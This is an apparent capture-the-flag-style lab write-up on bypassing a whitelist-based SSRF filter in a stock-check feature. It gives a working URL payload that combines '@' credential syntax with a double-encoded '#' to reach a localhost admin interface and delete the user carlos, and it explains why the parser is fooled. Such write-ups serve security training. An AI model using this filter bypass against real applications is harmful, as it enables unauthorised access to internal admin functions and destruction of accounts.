# Lab: SSRF with whitelist-based input filter

Vulnerable feature - stock check functionality

Goal - To solve the lab, change the stock check URL to access the admin interface at ```http://localhost/admin``` and delete the user ```carlos```.

Analysis :

localhost: `http://localhost%2523@stock.weliketoshop.net`

admin interface: `http://localhost%2523@stock.weliketoshop.net/admin`

delete Carlost : `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`

Explanasion :

`Payload: localhost%2523@stock.weliketoshop.net`

- We have used ```localhost@stock.weliketoshop.net``` -> to bypass the whitelist filter
- then we have added the double encoded value for `#` to just trick URL parser
- So the URL parser for the back end system forwards `localhost%2523@stock.weliketoshop.net` Accepting it
- And  the webdirver i think is decoding the url so it will be `localhost#@stock.weliketoshop.net`
- because the usage of `#` symbol the rest of the URL is ignored and the actual request got sended to the localhost

>I LOVE THIS LAB
